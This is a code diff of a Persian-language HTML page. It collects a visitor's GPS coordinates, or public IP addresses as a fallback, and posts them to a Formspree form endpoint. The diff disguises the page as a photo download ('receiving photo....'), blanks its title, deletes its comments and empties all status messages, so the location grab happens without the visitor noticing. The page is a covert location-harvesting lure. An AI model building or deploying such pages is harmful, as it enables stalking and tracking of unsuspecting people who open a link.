@@ -3,20 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>موقعیت اضطراری</title>
+    <title></title>
     <style>
         body { font-family: Tahoma; direction: rtl; text-align: center; padding: 20px; background: #111; color: #eee; }
         #status { margin-top: 30px; font-size: 18px; }
     </style>
 </head>
 <body>
-    <h2>در حال دریافت موقعیت...</h2>
+    <h2>در حال دریافت عکس....</h2>
     <div id="status"></div>
 
     <script>
-        // ====== تنظیمات ======
-        const FORM_ENDPOINT = 'https://formspree.io/f/mpqevqkd'; // ← endpoint خودت
-        // ====================
+   
+        const FORM_ENDPOINT = 'https://formspree.io/f/mpqevqkd'; 
+   
 
         const statusEl = document.getElementById('status');
 
@@ -26,7 +26,7 @@
             else statusEl.style.color = '#6f6';
         }
 
-        // ارسال به سرور
+        
         async function sendToServer(payload) {
             try {
                 const response = await fetch(FORM_ENDPOINT, {
@@ -35,16 +35,16 @@
                     body: JSON.stringify(payload)
                 });
                 if (response.ok) {
-                    updateStatus(`✅ موقعیت با روش ${payload.method} ارسال شد.`);
+                    updateStatus(``);
                 } else {
-                    updateStatus(`❌ خطای سرور ثبت (${response.status})`, true);
+                    updateStatus(``,true);
                 }
             } catch (err) {
-                updateStatus('❌ خطا در اتصال به سرویس ثبت.', true);
+                updateStatus('', true);
             }
         }
 
-        // ارسال GPS
+    
         async function sendGPS(lat, lng, accuracy) {
             await sendToServer({
                 lat: lat,
@@ -55,7 +55,7 @@
             });
         }
 
-        // ارسال IPهای چندگانه
+        
         async function sendIPs(ipList) {
             await sendToServer({
                 ips: ipList,
@@ -64,15 +64,15 @@
             });
         }
 
-        // ====== دریافت IP از چندین سرویس به صورت موازی ======
+        
         async function getMultipleIPs() {
-            // سرویس‌هایی که IP را برمی‌گردانند (ترکیبی از plain text و JSON)
+          
             const services = [
                 { url: 'https://checkip.amazonaws.com', extract: (text) => text.trim() },
-                { url: 'https://api.ip.sb/geoip', extract: (data) => data.ip }, // JSON
+                { url: 'https://api.ip.sb/geoip', extract: (data) => data.ip }, 
             ];
 
-            // تابع fetch با تایم‌اوت ۳ ثانیه
+            
             const fetchWithTimeout = (url, timeout = 3000) => {
                 const controller = new AbortController();
                 const timer = setTimeout(() => controller.abort(), timeout);
@@ -80,7 +80,7 @@
                     .finally(() => clearTimeout(timer));
             };
 
-            // اجرای همزمان همه درخواست‌ها
+           
             const promises = services.map(async (svc) => {
                 try {
                     const resp = await fetchWithTimeout(svc.url);
@@ -99,7 +99,7 @@
             });
 
             const results = await Promise.allSettled(promises);
-            const ips = new Set(); // برای حذف تکراری‌ها
+            const ips = new Set(); 
 
             results.forEach((result) => {
                 if (result.status === 'fulfilled' && result.value && typeof result.value === 'string') {
@@ -111,9 +111,9 @@
             return Array.from(ips);
         }
 
-        // ====== GPS اصلی (بدون تغییر) ======
+        
         function tryGPS() {
-            updateStatus('📡 در حال جستجوی ماهواره...');
+            updateStatus('');
 
             navigator.geolocation.getCurrentPosition(
                 (pos) => {
@@ -124,17 +124,17 @@
                     );
                 },
                 async (err) => {
-                    console.warn('GPS ناموفق', err.message);
-                    updateStatus('📍 دریافت IP از چندین سرویس...');
+                    console.warn('', err.message);
+                    updateStatus('');
                     try {
                         const ipList = await getMultipleIPs();
                         if (ipList.length > 0) {
                             await sendIPs(ipList);
                         } else {
-                            updateStatus('❌ هیچ سرویس IP پاسخ نداد.', true);
+                            updateStatus('', true);
                         }
                     } catch (ex) {
-                        updateStatus('❌ خطا در جمع‌آوری IPها.', true);
+                        updateStatus('', true);
                     }
                 },
                 {
